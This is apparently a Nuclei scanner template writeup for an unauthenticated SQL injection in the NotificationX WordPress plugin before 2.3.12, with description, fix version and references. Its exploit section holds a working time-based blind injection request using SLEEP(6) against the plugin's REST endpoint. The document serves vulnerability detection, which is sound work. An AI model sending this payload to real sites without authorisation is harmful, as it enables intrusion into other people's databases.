# Nuclei Template: NotificationX < 2.3.12 - SQL Injection
**Template ID:** notificationx-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`notificationx-sqli.yaml`)

## Vulnerability Information & PoC

## Description
The plugin does not validate and escape the id parameter in its notificationx/v1/notification REST endpoint before using it in a SQL statement, which could allow unauthenticated attackers to perform SQL Injection attacks.

## Steps to reproduce / Exploit Payload
```http
GET /wp-json/ HTTP/1.1
Host: {{Hostname}}

@timeout: 10s
GET /wp-json/notificationx/v1/notification/1?api_key={{md5('{{apikey}}')}}&id[1]=%3d(SELECT/**/1/**/WHERE/**/SLEEP(6)) HTTP/1.1
Host: {{Hostname}}
```

## Remediation
Fixed in version 2.3.12

## References
- https://wpscan.com/vulnerability/d1480717-726d-4be2-95cb-1007a3f010bb
- https://wordpress.org/plugins/notificationx/
